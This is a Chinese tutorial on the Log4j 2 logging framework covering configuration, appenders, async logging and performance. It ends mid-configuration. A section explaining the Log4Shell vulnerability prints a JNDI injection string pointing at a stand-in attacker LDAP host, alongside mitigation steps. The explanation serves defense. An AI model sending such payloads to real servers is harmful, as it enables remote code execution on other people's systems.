# 1. 概述与简介

## 1.1 什么是 Log4j 2

Apache Log4j 2 是 Log4j 1.x 的升级版本，于 2014 年正式发布。它是 Java 生态中最强大的日志框架之一，在性能、可靠性和功能上全面超越了 Log4j 1.x 和 Logback。Log4j 2 引入了 LMAX Disruptor 无锁并发框架实现异步日志，提供了垃圾-free 日志模式等创新特性。

## 1.2 Log4j 2 的发展历程

- **2014年7月**：Log4j 2.0 正式发布
- **2015-2020年**：持续迭代，引入异步 Logger、垃圾-free 日志等特性
- **2021年12月**：Log4Shell 漏洞（CVE-2021-44228）爆发，影响全球
- **2022-2024年**：安全修复和 3.x 开发
- **最新稳定版**：2.23.x（截至2024年）

## 1.3 Log4j 2 的核心优势

- **极高的性能**：异步 Logger 基于 LMAX Disruptor，吞吐量远超 Logback
- **垃圾-free 日志**：在日志路径中减少或消除临时对象分配
- **插件架构**：几乎全部功能组件都是可插拔的
- **多配置格式**：支持 XML、JSON、YAML、Properties
- **自动重载配置**：无需重启即可重新加载配置
- **高级过滤**：基于上下文、时间、正则等多维度过滤
- **Lookup 机制**：支持从各种来源动态获取值（JNDI、环境变量、系统属性等）

# 2. 核心概念与架构

## 2.1 分层架构

Log4j 2 分为两个独立的模块：

### 2.1.1 log4j-api

公共 API 模块，提供日志接口：

- `org.apache.logging.log4j.Logger` - 日志接口
- `org.apache.logging.log4j.LogManager` - 获取 Logger 的入口
- `org.apache.logging.log4j.Marker` - 标记接口
- `org.apache.logging.log4j.ThreadContext` - 类似 SLF4J MDC 的上下文
- `org.apache.logging.log4j.message.Message` - 消息接口

### 2.1.2 log4j-core

核心实现模块，包含：

- Logger 实现
- Appender 实现
- Filter 实现
- Layout 实现
- 配置解析器
- 异步日志引擎

## 2.2 核心组件

```
+------------------+
|    Logger        |
| (应用程序调用接口) |
+--------+---------+
         |
         v
+------------------+
| LoggerConfig      |
| (配置记录器，决定 |
|  级别和 Appender) |
+--------+---------+
         |
         v
+------------------+      +------------------+
|    Appender      |----->|    Layout        |
| (日志输出目标)    |      | (消息格式化器)    |
+------------------+      +------------------+
         |
         v
+------------------+
|     Filter       |
| (过滤链)          |
+------------------+
```

## 2.3 Logger 层级

Log4j 2 的 Logger 层级关系与 Log4j 1.x 保持一致：

- Logger 通过名称形成层级树
- 子 Logger 继承父 Logger 的配置
- 根 Logger（名称为空字符串）是所有 Logger 的祖先

```java
// 获取 Logger
Logger logger = LogManager.getLogger(MyClass.class);
// 等价于 LogManager.getLogger("com.example.MyClass")

// 层级示例
// Root Logger (名称: "")
//  ├── com (com)
//  │   ├── com.example (com.example)
//  │   │   └── com.example.MyClass (com.example.MyClass)
//  │   └── com.other (com.other)
//  └── org (org)
```

## 2.4 日志级别

Log4j 2 定义了 8 个级别（比 SLF4J 多了 FATAL 和 OFF）：

| 级别 | 整数值 | 用途 |
|------|--------|------|
| OFF | 0 | 关闭所有日志 |
| FATAL | 100 | 严重错误，导致应用终止 |
| ERROR | 200 | 错误事件 |
| WARN | 300 | 潜在危险情况 |
| INFO | 400 | 信息性消息 |
| DEBUG | 500 | 调试信息 |
| TRACE | 600 | 最详细的信息 |
| ALL | Integer.MAX_VALUE | 所有级别 |

Log4j 2 还支持自定义级别：

```java
// 创建自定义日志级别
Level AUDIT = Level.forName("AUDIT", 350);
```

## 2.5 Log4j 2 vs Log4j 1.x

| 特性 | Log4j 1.x | Log4j 2 |
|------|-----------|---------|
| 异步日志 | 简单 AsyncAppender | LMAX Disruptor 无锁异步 |
| 性能 | 低 | 高（10倍以上提升） |
| 垃圾-free | 不支持 | 支持 |
| 配置格式 | 仅 Properties | XML/JSON/YAML/Properties |
| 插件机制 | 无 | SPI 插件架构 |
| Lookup | 无 | 支持（JNDI、环境变量等） |
| 并发 | 同步锁 | 无锁设计 |
| 维护状态 | 已停止 | 活跃维护 |

# 3. 配置详解

## 3.1 添加 Maven 依赖

```xml
<!-- Log4j 2 BOM（统一版本管理） -->
<dependencyManagement>
    <dependencies>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-bom</artifactId>
            <version>2.23.0</version>
            <scope>import</scope>
            <type>pom</type>
        </dependency>
    </dependencies>
</dependencyManagement>

<!-- API -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-api</artifactId>
</dependency>

<!-- Core -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
</dependency>

<!-- 如果需要 SLF4J 绑定 -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-slf4j-impl</artifactId>
</dependency>
```

## 3.2 配置文件格式

Log4j 2 支持四种配置文件格式，按优先级查找：

## 3.3 XML 配置（推荐）

```xml
<?xml version="1.0" encoding="UTF-8"?>
<Configuration status="WARN" monitorInterval="30">
    <Properties>
        <Property name="log-path">./logs</Property>
        <Property name="pattern">%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %c{1.} - %msg%n</Property>
    </Properties>

    <Appenders>
        <Console name="Console" target="SYSTEM_OUT">
            <PatternLayout pattern="${pattern}" />
        </Console>

        <RollingFile name="RollingFile"
                     fileName="${log-path}/app.log"
                     filePattern="${log-path}/app.%d{yyyy-MM-dd}.%i.log.gz">
            <PatternLayout pattern="${pattern}" />
            <Policies>
                <TimeBasedTriggeringPolicy />
                <SizeBasedTriggeringPolicy size="100 MB" />
            </Policies>
            <DefaultRolloverStrategy max="30" />
        </RollingFile>
    </Appenders>

    <Loggers>
        <Logger name="com.example" level="DEBUG" additivity="false">
            <AppenderRef ref="RollingFile" />
        </Logger>

        <Root level="INFO">
            <AppenderRef ref="Console" />
            <AppenderRef ref="RollingFile" />
        </Root>
    </Loggers>
</Configuration>
```

### 3.3.1 JSON 配置

```json
{
  "configuration": {
    "status": "WARN",
    "monitorInterval": 30,
    "properties": {
      "property": [
        { "name": "log-path", "value": "./logs" },
        { "name": "pattern", "value": "%d{HH:mm:ss.SSS} [%t] %-5level %c{1.} - %msg%n" }
      ]
    },
    "appenders": {
      "Console": {
        "name": "Console",
        "target": "SYSTEM_OUT",
        "PatternLayout": { "pattern": "${pattern}" }
      },
      "RollingFile": {
        "name": "RollingFile",
        "fileName": "${log-path}/app.log",
        "filePattern": "${log-path}/app.%d{yyyy-MM-dd}.%i.log.gz",
        "PatternLayout": { "pattern": "${pattern}" },
        "Policies": {
          "TimeBasedTriggeringPolicy": {},
          "SizeBasedTriggeringPolicy": { "size": "100 MB" }
        },
        "DefaultRolloverStrategy": { "max": "30" }
      }
    },
    "loggers": {
      "logger": [
        {
          "name": "com.example",
          "level": "DEBUG",
          "additivity": false,
          "AppenderRef": { "ref": "RollingFile" }
        }
      ],
      "root": {
        "level": "INFO",
        "AppenderRef": [
          { "ref": "Console" },
          { "ref": "RollingFile" }
        ]
      }
    }
  }
}
```

### 3.3.2 YAML 配置

```yaml
Configuration:
  status: WARN
  monitorInterval: 30
  properties:
    property:
      - name: log-path
        value: "./logs"
      - name: pattern
        value: "%d{HH:mm:ss.SSS} [%t] %-5level %c{1.} - %msg%n"
  appenders:
    Console:
      name: Console
      target: SYSTEM_OUT
      PatternLayout:
        pattern: "${pattern}"
    RollingFile:
      name: RollingFile
      fileName: "${log-path}/app.log"
      filePattern: "${log-path}/app.%d{yyyy-MM-dd}.%i.log.gz"
      PatternLayout:
        pattern: "${pattern}"
      Policies:
        TimeBasedTriggeringPolicy: {}
        SizeBasedTriggeringPolicy:
          size: 100 MB
      DefaultRolloverStrategy:
        max: 30
  loggers:
    logger:
      - name: com.example
        level: DEBUG
        additivity: false
        AppenderRef:
          ref: RollingFile
    root:
      level: INFO
      AppenderRef:
        - ref: Console
        - ref: RollingFile
```

### 3.3.3 Properties 配置

```properties
status = WARN
monitorInterval = 30

property.log-path = ./logs
property.pattern = %d{HH:mm:ss.SSS} [%t] %-5level %c{1.} - %msg%n

appender.console.type = Console
appender.console.name = Console
appender.console.target = SYSTEM_OUT
appender.console.layout.type = PatternLayout
appender.console.layout.pattern = ${pattern}

appender.rolling.type = RollingFile
appender.rolling.name = RollingFile
appender.rolling.fileName = ${log-path}/app.log
appender.rolling.filePattern = ${log-path}/app.%d{yyyy-MM-dd}.%i.log.gz
appender.rolling.layout.type = PatternLayout
appender.rolling.layout.pattern = ${pattern}
appender.rolling.policies.type = Policies
appender.rolling.policies.time.type = TimeBasedTriggeringPolicy
appender.rolling.policies.size.type = SizeBasedTriggeringPolicy
appender.rolling.policies.size.size = 100MB
appender.rolling.strategy.type = DefaultRolloverStrategy
appender.rolling.strategy.max = 30

logger.example.name = com.example
logger.example.level = DEBUG
logger.example.additivity = false
logger.example.appenderRef.rolling.ref = RollingFile

rootLogger.level = INFO
rootLogger.appenderRef.console.ref = Console
rootLogger.appenderRef.rolling.ref = RollingFile
```

## 3.4 Appender 详解

### 3.4.1 Console Appender

```xml
<Console name="Console" target="SYSTEM_OUT">
    <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %c{1.} - %msg%n" />
    <!-- 或 JSON 格式 -->
    <JsonLayout complete="false" compact="true" properties="true" />
</Console>
```

### 3.4.2 File Appender

```xml
<File name="File" fileName="${log-path}/app.log" append="true" bufferedIO="true">
    <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %c{1.} - %msg%n" />
</File>
```

参数说明：
- `bufferedIO="true"`：启用缓冲 I/O，提升性能
- `advertise="true"`：通过 JNDI 发布文件位置

### 3.4.3 RollingFile Appender

```xml
<RollingFile name="RollingFile"
             fileName="${log-path}/app.log"
             filePattern="${log-path}/app.%d{yyyy-MM-dd}.%i.log.gz">
    <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %c{1.} - %msg%n" />
    <CronTriggeringPolicy schedule="0 0 0 * * ?" /> <!-- 每天午夜触发 -->
    <Policies>
        <TimeBasedTriggeringPolicy interval="1" modulate="true" />  <!-- 每天滚动 -->
        <SizeBasedTriggeringPolicy size="100 MB" />                  <!-- 大小触发 -->
    </Policies>
    <DefaultRolloverStrategy max="30">
        <Delete basePath="${log-path}" maxDepth="1">
            <IfFileName glob="*.log.gz" />
            <IfLastModified age="30d" />
        </Delete>
    </DefaultRolloverStrategy>
</RollingFile>
```

两种触发策略组合使用：
- `TimeBasedTriggeringPolicy`：基于时间间隔触发（每天、每小时等）
- `SizeBasedTriggeringPolicy`：基于文件大小触发

### 3.4.4 RandomAccessFile Appender

使用 `RandomAccessFile` 替代 `FileOutputStream`，性能更优：

```xml
<!-- 比 File Appender 快 20-30% -->
<RandomAccessFile name="RandomAccessFile" fileName="${log-path}/app.log">
    <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %c{1.} - %msg%n" />
</RandomAccessFile>
```

### 3.4.5 RollingRandomAccessFile Appender

```xml
<RollingRandomAccessFile name="RollingRandomAccessFile"
                          fileName="${log-path}/app.log"
                          filePattern="${log-path}/app.%d{yyyy-MM-dd}.%i.log.gz">
    <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %c{1.} - %msg%n" />
    <Policies>
        <TimeBasedTriggeringPolicy interval="1" />
        <SizeBasedTriggeringPolicy size="100 MB" />
    </Policies>
</RollingRandomAccessFile>
```

### 3.4.6 Socket/HTTP Appender

```xml
<!-- Socket Appender -->
<Socket name="Socket" host="logserver" port="4560">
    <SerializedLayout />  <!-- 序列化发送 -->
</Socket>

<!-- HTTP Appender -->
<Http name="Http" url="http://log-collector:8080/api/logs">
    <JsonLayout properties="true" />
    <Property name="Content-Type" value="application/json" />
</Http>
```

### 3.4.7 JMS Appender

```xml
<JMS name="JMS" topicBindingName="logTopic"
     factoryBindingName="connectionFactory"
     factoryName="org.apache.activemq.jndi.ActiveMQInitialContextFactory"
     providerURL="tcp://localhost:61616">
    <PatternLayout pattern="%d [%t] %-5level %c{1.} - %msg%n" />
</JMS>
```

## 3.5 Layout 详解

### 3.5.1 PatternLayout

Log4j 2 的 PatternLayout 转换字符：

| 字符 | 说明 | 示例 |
|------|------|------|
| `%d{pattern}` | 日期时间 | `%d{yyyy-MM-dd HH:mm:ss.SSS}` |
| `%t` | 线程名 | `main` |
| `%p` | 日志级别 | `INFO` |
| `%c{n}` | Logger 名称（n=精度） | `%c{1.} = c.e.MyClass` |
| `%C{n}` | 类名 | `%C{1.} = MyClass` |
| `%M` | 方法名 | `createUser` |
| `%L` | 行号 | `42` |
| `%m` / `%msg` | 日志消息 | 用户消息 |
| `%n` | 换行符 | 平台换行 |
| `%X{key}` | Thread Context 值 | `%X{requestId}` |
| `%K{key}` | Map Message 值 | `%K{userId}` |
| `%l` | 调用者位置信息 | `com.example.MyClass.main(MyClass.java:10)` |
| `%F` | 文件名 | `MyClass.java` |
| `%i` | 滚动索引 | `1`, `2`, `3` |
| `%style{text}{color}` | ANSI 着色 | `%style{%-5p}{bright}` |
| `%highlight{text}` | 级别着色 | `%highlight{%-5level}` |

### 3.5.2 JSON Layout

```xml
<!-- JSON 输出，适合日志收集系统（ELK、Splunk 等） -->
<JsonLayout complete="false" compact="true" eventEol="true"
            properties="true" includeStacktrace="true">
    <!-- complete=false: 不输出 JSON 数组 -->
    <!-- compact=true: 压缩格式（无缩进） -->
    <!-- eventEol=true: 每行一个 JSON 对象 -->
    <!-- properties=true: 包含 ThreadContext -->
</JsonLayout>
```

输出示例：
```json
{"timeMillis":1700000000000,"thread":"main","level":"INFO","loggerName":"com.example.MyClass","message":"User created","endOfBatch":false,"loggerFqcn":"org.apache.logging.log4j.spi.AbstractLogger","threadId":1,"threadPriority":5}
```

### 3.5.3 XML Layout

```xml
<XMLLayout complete="false" compact="true" />
```

### 3.5.4 CSV Layout

```xml
<CsvLogEventLayout delimiter="," quoteMode="NONE" />
```

## 3.6 过滤器（Filter）

### 3.6.1 过滤器类型

Log4j 2 的过滤器有三种放置位置：

| 位置 | 作用域 | 优先级 |
|------|--------|--------|
| Context-wide Filter | 全局 | 最高 |
| LoggerFilter | 特定 Logger | 中 |
| Appender Filter | 特定 Appender | 低 |

### 3.6.2 常用过滤器

```xml
<Configuration>
    <!-- 全局过滤器 -->
    <Filters>
        <!-- 级别范围过滤器 -->
        <BurstFilter level="INFO" rate="100" maxBurst="200" />
    </Filters>

    <Appenders>
        <RollingFile name="RollingFile" ...>
            <Filters>
                <!-- 拒绝所有 MARKER 日志 -->
                <MarkerFilter marker="FLOW" onMatch="DENY" onMismatch="NEUTRAL" />
                <!-- 接受 INFO 及以上级别 -->
                <ThresholdFilter level="INFO" onMatch="ACCEPT" onMismatch="DENY" />
            </Filters>
        </RollingFile>

        <Console name="Console" ...>
            <Filters>
                <!-- 正则过滤 -->
                <RegexFilter regex=".*password.*" onMatch="DENY" onMismatch="NEUTRAL" />
                <!-- 时间过滤 -->
                <TimeFilter start="00:00:00" end="23:59:59" onMatch="ACCEPT" onMismatch="DENY" />
            </Filters>
        </Console>
    </Appenders>
</Configuration>
```

### 3.6.3 StructuredDataFilter

```xml
<!-- 基于结构化数据的过滤 -->
<StructuredDataFilter onMatch="ACCEPT" onMismatch="NEUTRAL">
    <Pair key="eventType" value="audit" />
</StructuredDataFilter>
```

## 3.7 Lookup 机制

Log4j 2 的 Lookup 用于在配置中动态获取值：

### 3.7.1 内置 Lookup

```xml
<!-- 系统属性 -->
<Property name="log-path">${sys:catalina.home}/logs</Property>

<!-- 环境变量 -->
<Property name="app-env">${env:APP_ENV:-dev}</Property>

<!-- Spring Boot 配置 -->
<Property name="app-name">${spring:spring.application.name}</Property>

<!-- JNDI -->
<Property name="jndi-value">${jndi:logging/context-name}</Property>

<!-- 日期 -->
<Property name="date">${date:yyyy-MM-dd}</Property>

<!-- 上下文 -->
<Property name="ctx-value">${ctx:requestId}</Property>
```

### 3.7.2 自定义 Lookup

```java
package com.example.logging;

import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.config.plugins.Plugin;
import org.apache.logging.log4j.core.lookup.StrLookup;

@Plugin(name = "custom", category = StrLookup.CATEGORY)
public class CustomLookup implements StrLookup {
    @Override
    public String lookup(String key) {
        if ("hostname".equals(key)) {
            return System.getenv("HOSTNAME");
        }
        if ("instance-id".equals(key)) {
            return System.getProperty("ec2.instance-id", "local");
        }
        return null;
    }

    @Override
    public String lookup(LogEvent event, String key) {
        return lookup(key);
    }
}
```

```xml
<Property name="instance-info">${custom:hostname}:${custom:instance-id}</Property>
```

# 4. 高级特性

## 4.1 异步 Logger（LMAX Disruptor）

Log4j 2 最强大的性能特性——使用 LMAX Disruptor 框架实现无锁异步日志：

### 4.1.1 配置方式

```xml
<Configuration>
    <Appenders>
        <RollingFile name="RollingFile" ...>
            <PatternLayout pattern="%d %p %c{1.} [%t] %m%n" />
        </RollingFile>
    </Appenders>

    <Loggers>
        <!-- 异步 Logger -->
        <AsyncLogger name="com.example" level="INFO" additivity="false">
            <AppenderRef ref="RollingFile" />
        </AsyncLogger>

        <!-- 异步根 Logger -->
        <AsyncRoot level="INFO">
            <AppenderRef ref="RollingFile" />
        </AsyncRoot>
    </Loggers>
</Configuration>
```

### 4.1.2 全局异步日志

```xml
<!-- log4j2.component.properties -->
Log4jContextSelector=org.apache.logging.log4j.core.async.AsyncLoggerContextSelector
```

或在系统属性中设置：
```bash
-DLog4jContextSelector=org.apache.logging.log4j.core.async.AsyncLoggerContextSelector
```

### 4.1.3 Disruptor 配置参数

```xml
<Configuration>
    <!-- 系统属性方式配置 Disruptor -->
    <Properties>
        <!-- RingBuffer 大小（必须是 2 的幂） -->
        <Property name="AsyncLoggerConfig.RingBufferSize">262144</Property>
        <!-- 等待策略 -->
        <Property name="AsyncLoggerConfig.WaitStrategy">sleep</Property>
    </Properties>
    ...
</Configuration>
```

等待策略对比：

| 策略 | 适用场景 | CPU 使用 | 延迟 |
|------|---------|---------|------|
| `sleep` | 生产环境（推荐） | 低 | 中 |
| `yield` | 高吞吐 | 中 | 低 |
| `block` | 低延迟 | 低 | 极低 |
| `busySpin` | 极低延迟（线程绑定） | 极高 | 极低 |

## 4.2 垃圾-free 日志（Garbage-Free Logging）

Log4j 2.6+ 引入了垃圾-free 日志模式，目标是减少日志路径中的对象分配以降低 GC 压力：

```xml
<!-- 系统属性启用 -->
-Dlog4j2.enable.threadlocals=true
-Dlog4j2.enable.direct.encoders=true
```

### 4.2.1 垃圾-free 的原理

1. **ThreadLocal 复用**：`StringBuilder`、`CharArray` 等缓冲区在线程内复用
2. **直接编码**：绕过中间字符串，直接将格式化结果编码到字节缓冲区
3. **常量池使用**：使用常量字符串避免动态分配
4. **对象池化**：`LogEvent` 等对象使用对象池

### 4.2.2 启用条件

```xml
<Configuration>
    <Properties>
        <Property name="log4j2.enable.threadlocals">true</Property>
        <Property name="log4j2.enable.direct.encoders">true</Property>
    </Properties>
    <Appenders>
        <!-- 需要使用支持垃圾-free 的 Appender -->
        <RollingRandomAccessFile name="RollingFile" ... />
    </Appenders>
</Configuration>
```

**注意**：
- `Console Appender` 默认不支持垃圾-free
- `RandomAccessFile Appender` 和 `RollingRandomAccessFile Appender` 支持
- 某些 Layout（如 JSON Layout）在垃圾-free 模式下工作不佳

## 4.3 Thread Context（MDC）

Log4j 2 的 `ThreadContext` 对应 SLF4J 的 MDC，但功能更强大：

```java
import org.apache.logging.log4j.ThreadContext;

public class RequestFilter {
    public void doFilter(...) {
        // 入栈/出栈式的上下文（类似 NDC）
        ThreadContext.push("requestId", UUID.randomUUID().toString());
        ThreadContext.put("userId", userId);
        ThreadContext.put("ip", remoteAddr);

        // 使用堆栈映射
        ThreadContext.push("layer", "controller");

        log.info("Processing request");
        // 输出: [requestId:abc] [userId:123] [ip:1.2.3.4] Processing request

        ThreadContext.pop();  // 弹出堆栈
        ThreadContext.remove("requestId");
        ThreadContext.remove("userId");
        ThreadContext.remove("ip");
    }
}
```

在配置中引用：

```xml
<PatternLayout pattern="%d [%t] %-5level %c{1.} [%X{requestId}] [%R] - %msg%n" />
<!-- %X{key} 获取 Map 值 -->
<!-- %R 获取栈深度 -->
```

## 4.4 自定义插件

Log4j 2 的插件机制是其核心设计之一：

```java
package com.example.logging;

import org.apache.logging.log4j.core.Core;
import org.apache.logging.log4j.core.Filter;
import org.apache.logging.log4j.core.Layout;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.appender.AbstractAppender;
import org.apache.logging.log4j.core.config.plugins.*;

@Plugin(name = "CustomAppender", category = Core.CATEGORY_NAME,
        elementType = Appender.ELEMENT_TYPE, printObject = true)
public class CustomAppender extends AbstractAppender {

    private String customField;

    protected CustomAppender(String name, Filter filter, Layout<?> layout,
                              boolean ignoreExceptions, String customField) {
        super(name, filter, layout, ignoreExceptions);
        this.customField = customField;
    }

    @PluginFactory
    public static CustomAppender createAppender(
            @PluginAttribute("name") String name,
            @PluginElement("Layout") Layout<?> layout,
            @PluginElement("Filter") Filter filter,
            @PluginAttribute("customField") String customField) {
        if (name == null) {
            LOGGER.error("No name provided for CustomAppender");
            return null;
        }
        return new CustomAppender(name, filter, layout, true, customField);
    }

    @Override
    public void append(LogEvent event) {
        byte[] bytes = getLayout().toByteArray(event);
        // 自定义输出逻辑
        System.out.printf("[%s] %s%n", customField, new String(bytes));
    }
}
```

配置使用：

```xml
<CustomAppender name="Custom" customField="myapp">
    <PatternLayout pattern="%d %p %m%n" />
</CustomAppender>
```

## 4.5 Routing Appender

根据内容动态路由日志到不同的 Appender：

```xml
<Routing name="Routing">
    <Routes pattern="$${ctx:serviceId}">
        <!-- 默认路由 -->
        <Route key="$${ctx:serviceId}">
            <RollingFile name="RollingFile-${ctx:serviceId}"
                         fileName="${log-path}/service-${ctx:serviceId}.log"
                         filePattern="${log-path}/service-${ctx:serviceId}.%d{yyyy-MM-dd}.log.gz">
                <PatternLayout pattern="%d %p %c{1.} [%t] %m%n" />
            </RollingFile>
        </Route>
        <!-- 特定服务路由 -->
        <Route ref="Console" key="admin-service" />
    </Routes>
</Routing>
```

## 4.6 StrSubstitutor 高级变量替换

```xml
<Configuration>
    <Properties>
        <!-- 嵌套变量 -->
        <Property name="base-path">/var/log/${env:HOSTNAME:-localhost}</Property>
        <!-- 默认值 -->
        <Property name="log-level">${sys:log.level:-INFO}</Property>
    </Properties>

    <Appenders>
        <RollingFile name="RollingFile"
                     fileName="${base-path}/app.log" ...>
        </RollingFile>
    </Appenders>
</Configuration>
```

# 5. 底层原理

## 5.1 LMAX Disruptor 无锁并发框架

### 5.1.1 什么是 Disruptor

Disruptor 是 LMAX 交易所开发的高性能无锁并发框架，Log4j 2 用它实现了异步日志。相比传统的 `BlockingQueue`，Disruptor 的优势：

| 特性 | BlockingQueue | Disruptor |
|------|--------------|-----------|
| 数据结构 | 链表/数组 | 环形缓冲区（RingBuffer） |
| 并发模型 | 锁 + CAS | 无锁（CAS only） |
| 缓存友好 | 否 | 是（预分配 + 缓存行填充） |
| GC 压力 | 中（动态创建节点） | 低（预分配对象） |
| 吞吐量 | 中 | 极高 |
| 延迟 | 中 | 极低（可预测） |

### 5.1.2 RingBuffer 原理

```
                      Producer
                         |
                         v
+----+----+----+----+----+----+----+----+
|    |    |    |    |    |    |    |    |  <- 预分配的环形缓冲区
+----+----+----+----+----+----+----+----+
  ^              ^              ^
  |              |              |
 Consumer2    Consumer1     Producer (写入位置)
 (读位置)       (读位置)
```

**关键特性**：
- 环形数组，大小必须是 2 的幂
- 预分配槽位，避免 GC
- 使用 CAS 操作替代锁
- 缓存行填充（Cache Line Padding）避免伪共享

### 5.1.3 Log4j 2 异步日志流程

```
                 生产者线程                   消费者线程
                     |                          |
  Logger.log(msg)    |                          |
      |              |                          |
      v              |                          |
  Log4jLogger   -----+---->  RingBuffer   ---->+----> Appender
      |              |        (无锁)            |        |
      v              |                          |        v
  LogEvent           |                          |   写入文件/网络等
  (预分配对象)        |                          |
```

## 5.2 Logger 层级与 LoggerConfig

Log4j 2 的配置模型与 Logback 有显著不同：

```
Logger (API)        LoggerConfig (配置)
   |                     |
   | 1. 调用             | 1. 保存级别
   | 2. 委托给           | 2. 关联 Appender
   |                     | 3. 继承关系
   v                     v
  LogManager -----> LoggerContext
                        |
                  +-----+------+
                  |            |
           LoggerConfig     LoggerConfig
           (com.example)    (root)
```

**关键差异**：
- `Logger` 是 API 接口，不可变
- `LoggerConfig` 是配置对象，可在运行时重新配置
- 每个 `Logger` 关联一个 `LoggerConfig`
- 配置变更时，新的 `LoggerConfig` 会替换旧的

## 5.3 混合同步/异步 Logger

Log4j 2 可以混合使用同步和异步 Logger：

```xml
<Loggers>
    <!-- 同步 Logger -->
    <Logger name="com.example.sync" level="INFO">
        <AppenderRef ref="Console" />
    </Logger>

    <!-- 异步 Logger -->
    <AsyncLogger name="com.example.async" level="INFO">
        <AppenderRef ref="RollingFile" />
    </AsyncLogger>

    <!-- 同步根 Logger -->
    <Root level="INFO">
        <AppenderRef ref="Console" />
    </Root>
</Loggers>
```

## 5.4 配置文件重载机制

```xml
<Configuration monitorInterval="30">
    <!-- monitorInterval=30 表示每30秒检查配置变更 -->
</Configuration>
```

重载流程：
1. `Configurator` 启动定时检查线程
2. 检测到文件变更后，创建新的 `LoggerContext`
3. 新配置生成新的 `LoggerConfig` 实例
4. 原子性地替换旧配置
5. 旧配置的 Appender 在完成当前日志后关闭

## 5.5 Log4Shell 漏洞原理（CVE-2021-44228）

### 5.5.1 漏洞概述

- **CVE ID**：CVE-2021-44228
- **影响版本**：Log4j 2.0 - 2.14.1
- **CVSS 评分**：10.0（最高严重等级）
- **发现时间**：2021年11月24日（公开于12月9日）
- **影响范围**：全球数百万 Java 应用

### 5.5.2 漏洞原理

Log4j 2 的 JNDI Lookup 功能允许在日志消息中通过 `${jndi:ldap://attacker.com/evil}` 格式执行 JNDI 查找。攻击者可以通过控制日志消息的内容，使 Log4j 2 执行远程 JNDI 查找，加载远程 Class，最终实现远程代码执行（RCE）。

```
攻击者发送恶意请求:
    GET /search?q=${jndi:ldap://evil.com/exploit}

服务器日志:
    log.info("Search query: {}", query);  // query = ${jndi:ldap://evil.com/exploit}

Log4j 2 处理流程:
    1. 格式化消息时发现 ${jndi:...}
    2. 触发 JNDI Lookup
    3. JNDI 连接到攻击者的 LDAP 服务器
    4. LDAP 服务器返回包含恶意 Java 类的引用
    5. Log4j 2 加载并执行恶意类
    6. 攻击者获得远程代码执行权限
```

### 5.5.3 漏洞触发条件

```java
// 以下所有常见的日志写法都会触发
log.error("Error: {}", userInput);        // 参数化日志
log.error("Error: " + userInput);         // 字符串拼接
logger.error(userInput);                  // 直接输出
```

### 5.5.4 修复措施

**立即修复（2.15.0+）**：
```xml
<!-- 升级到 Log4j 2.15.0+ -->
<!-- 或 2.12.2+ (Java 7) -->
```

**临时缓解措施**：
```bash
# JVM 参数禁用 JNDI
-Dlog4j2.formatMsgNoLookups=true

# 或移除 JndiLookup 类
zip -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class

# 设置系统属性
log4j2.enableJndiLookup=false
log4j2.enableJndiJms=false
```

### 5.5.5 后续版本安全增强

Log4j 2.17.0+（最终修复版本）：
- 默认禁用 JNDI Lookup
- 限制 JNDI 只允许 Java 协议
- 添加 `log4j2.enableJndiLookup` 系统属性控制
- 移除消息 Lookup 功能
- 限制 LDAP 只能访问本地资源

# 6. 性能优化

## 6.1 异步 Logger 性能数据

| 场景 | 吞吐量（日志/秒） | CPU 使用 | GC 压力 |
|------|------------------|---------|---------|
| 同步 File Appender | ~500,000 | 中 | 中 |
| 同步 + immediateFlush=false | ~2,000,000 | 中 | 中 |
| 异步 Logger + File Appender | ~10,000,000+ | 高 | 低 |
| 异步 + 垃圾-free | ~15,000,000+ | 高 | 极低 |

## 6.2 性能优化最佳实践

### 6.2.1 使用 RandomAccessFile

```xml
<!-- RandomAccessFile 比 File 快 20-30% -->
<RandomAccessFile name="File" fileName="app.log">
    <PatternLayout pattern="%d %p %c{1.} [%t] %m%n" />
</RandomAccessFile>
```

### 6.2.2 使用异步 Logger 和垃圾-free

```xml
<Configuration>
    <Properties>
        <Property name="AsyncLoggerConfig.RingBufferSize">65536</Property>
        <Property name="AsyncLoggerConfig.WaitStrategy">sleep</Property>
        <Property name="log4j2.enable.threadlocals">true</Property>
        <Property name="log4j2.enable.direct.encoders">true</Property>
    </Properties>

    <Appenders>
        <RollingRandomAccessFile name="File" fileName="app.log" ...>
            <PatternLayout pattern="%d %p %c{1.} [%t] %m%n" />
        </RollingRandomAccessFile>
    </Appenders>

    <Loggers>
        <AsyncRoot level="INFO">
            <AppenderRef ref="File" />
        </AsyncRoot>
    </Loggers>
</Configuration>
```

### 6.2.3 避免调用者位置信息

```xml
<!-- 不包含行号、方法名、文件名等信息 -->
<PatternLayout pattern="%d %p %c{1.} [%t] %m%n" />

<!-- 避免使用以下转换字（性能开销大） -->
<!-- %C、%M、%L、%l、%F -->
```

### 6.2.4 选择合适的 RingBuffer 大小

```bash
# 高吞吐场景
-DAsyncLoggerConfig.RingBufferSize=262144  # 2^18

# 低延迟场景
-DAsyncLoggerConfig.RingBufferSize=65536   # 2^16
```

RingBuffer 大小必须是 2 的幂，更大的缓冲区可以应对突发日志，但占用更多内存。

## 6.3 混合配置策略

```xml
<Loggers>
    <!-- 核心业务 Logger：异步 -->
    <AsyncLogger name="com.example.core" level="INFO" additivity="false">
        <AppenderRef ref="RollingFile" />
    </AsyncLogger>

    <!-- 审计 Logger：同步（保证不丢失） -->
    <Logger name="com.example.audit" level="INFO" additivity="false">
        <AppenderRef ref="AuditFile" />
    </Logger>

    <!-- 调试 Logger：同步 -->
    <Logger name="com.example.debug" level="DEBUG" additivity="false">
        <AppenderRef ref="Console" />
    </Logger>

    <!-- 默认：异步 -->
    <AsyncRoot level="INFO">
        <AppenderRef ref="RollingFile" />
